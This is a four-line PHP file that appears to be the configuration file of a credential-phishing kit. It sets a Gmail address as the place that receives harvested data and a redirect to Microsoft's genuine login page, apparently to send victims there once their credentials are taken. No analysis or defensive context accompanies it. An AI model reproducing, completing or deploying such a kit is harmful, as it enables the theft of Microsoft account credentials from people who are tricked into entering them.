<?php 
$Receive_email="dollarsp142@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>